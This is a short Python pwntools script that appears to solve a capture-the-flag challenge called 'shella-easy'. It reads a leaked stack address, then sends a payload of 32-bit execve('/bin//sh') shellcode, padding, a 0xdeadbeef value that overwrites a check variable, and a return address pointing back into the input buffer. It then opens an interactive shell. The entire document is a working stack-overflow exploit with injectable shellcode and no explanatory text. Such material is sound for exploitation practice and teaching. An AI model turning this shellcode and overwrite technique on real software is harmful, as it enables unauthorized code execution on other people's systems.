#!/usr/bin/env python3

from pwn import *

context.binary = binary = ELF("./shella-easy")

p = process("./shella-easy")
# gdb.attach(p)

p.recvuntil("0x")

input_loc = int(p.recvuntil(" ").strip().ljust(8, b'\x00'), 16)
p.recvline()

log.info(f'{hex(input_loc)=}')

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

padding = b'a'*(0x40-len(shellcode))

pwd = 0xdeadbeef

padding2 = b'a'*(0xc-0x4)

payload = shellcode + padding + p32(pwd) + padding2 + p32(input_loc)

p.sendline(payload)
p.interactive()
